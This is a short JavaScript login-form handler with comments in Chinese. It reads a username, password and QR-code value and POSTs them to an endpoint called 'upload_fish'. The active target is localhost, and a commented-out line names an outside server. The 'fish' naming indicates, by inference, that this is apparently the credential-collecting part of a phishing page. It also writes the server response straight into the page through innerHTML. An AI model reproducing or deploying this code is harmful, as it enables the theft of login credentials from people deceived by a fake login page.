var isClicked = false;
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // 阻止表单默认提交行为

    // 获取用户名和密码
    const username = document.getElementById("user").value; 
	const password = document.getElementById("password").value;
	const qrcode = document.getElementById("qrcode").value;
    if (username == null || username == "" || password == null || password == "" || qrcode == null || qrcode == "") {
        alert("请检查是否所有输入框都输入了内容");
        return false;
    }
    // 发送POST请求
    if (!isClicked) {
        isClicked = true;
        //fetch('https://yxvm.gzx7301.top:23056/upload_fish', {
        fetch('http://localhost:23056/upload_fish', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            //body: `user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&qr=${encodeURIComponent(qrcode)}`

            body: JSON.stringify({
                user: encodeURIComponent(username),
                password: encodeURIComponent(password),
                qr: encodeURIComponent(qrcode)
            })
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            } else {
                document.getElementById('result').innerText = 'Http Error ' + response.status;
            }
        })
        .then(data => {
            // 动态显示POST请求的结果在result标签
            document.getElementById('result').innerHTML = `${data}`
        })
        .catch(error => {
            console.error('请求失败：', error);
        });
        
    
        setTimeout(function() {
            isClicked = false;
        }, 500);  // 500毫秒后，允许再次点击
    }
});